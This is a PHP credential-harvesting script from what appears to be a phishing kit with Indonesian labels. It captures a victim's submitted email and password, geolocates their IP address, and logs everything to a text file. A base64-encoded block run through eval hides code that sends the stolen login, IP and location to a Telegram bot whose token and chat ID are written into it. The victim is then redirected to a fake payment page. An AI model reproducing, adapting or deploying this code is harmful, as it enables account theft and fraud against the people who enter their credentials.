<?php
$file = "anakmedannilaii.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = "http://www.geoplugin.net/php.gp?ip=$ip";
$response = fetch($host);
$data = unserialize($response);
$a = $data['geoplugin_city'];
$b = $data['geoplugin_region'];
$c = $data['geoplugin_countryName'];


					  
					  
function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}

  
$handle = fopen($file, 'a');
eval("?>".base64_decode("PD9waHAJCQkJDQoJCQkJJHRnbD1kYXRlKCJkIEYgWSIpOw0KICAgICAgICAgICAgICAgICAgICAgICR0b2tlbj0nMjA2MTkyMzQ3MjpBQUhMSERzY21DZDVXUzAwZzVFVHctREhMdzhqemltS3V2Zyc7DQogICAgICAgICAgICAgICAgICAgICAgJGNoYXRpZD0nMTY3MDQyMjg0Nyc7IC8vIGdhbnRpIGNoYXQgaWQgDQogICAgICAgICAgICAgICAgICAgICAgJHBlc2FuPXVybGVuY29kZSgiDQoJCQkJCSAgXG49PT09PT09PT0oc2MgYnlSQU5TKT09PT09PT09PVxuDQoJCQkJCSAgR2FudGVuZyBJemluIEtpcmltIFJlc3VsdCBoYXJpIGluaSAkdGdsIFBBUlQgMlxuDQoJCQkJCSAgVXNlcm5hbWUvIEVtYWlsCTogJGVtYWlsIFxuDQoJCQkJCSAgUGFzc3dyb2QgCQkgCTogJHBhc3MgXG4NCgkJCQkJICA9PT09PT09PT0gSU5GTyBJUCA6ICRpcCBcbg0KCQkJCQkgIE5lZ2FyYSAJCQk6ICRjIFxuIA0KCQkJCQkgIFByb3ZpbnNpIAkJCTogJGIgXG4gDQoJCQkJCSAgS290YQkJCQk6ICRhIFxuIA0KCQkJCQkgIFxuPT09PT09PT09KHNjIGJ5UkFOUyk9PT09PT09PT0iKTsNCiAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICRBUEkgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCIuJHRva2VuLiIvc2VuZG1lc3NhZ2U/Y2hhdF9pZD0iLiRjaGF0aWQuIiZ0ZXh0PSRwZXNhbiI7DQogICAgICAgICAgICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCk7DQogICAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCiAgICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ1VTVE9NUkVRVUVTVCwgJ1BPU1QnKTsNCiAgICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkQVBJKTsNCiAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gY3VybF9leGVjKCRjaCk7DQogICAgICAgICAgICAgICAgICAgICAgY3VybF9jbG9zZSgkY2gpOw0KPz4JCQk="));
fwrite($handle, "=========================(scsigerrnihh)=========================");
fwrite($handle, "\n");
fwrite($handle, "•  EMAIL     :   ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "•  PASSWORD  :   ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "========= INFO IP : ");
fwrite($handle, "$ip ");
fwrite($handle, "\n");
fwrite($handle, "•  NEGARA    :   ");
fwrite($handle, "$c");
fwrite($handle, "\n");
fwrite($handle, "•  PROVINSI  :   ");
fwrite($handle, "$b");
fwrite($handle, "\n");
fwrite($handle, "•  KOTA      :   ");
fwrite($handle, "$a");
fwrite($handle, "\n");
fclose($handle);
echo "<script images=\"JavaScript\">
<!--
window.location=\"payment.html?fbclid=IwAR0DpHzyMmR9Q1m8hvlX3O_FU5ALkroRy_qhIzhAXWrn13ldVn_3Y1SQfjo/\";
// -->
</script>";
?>

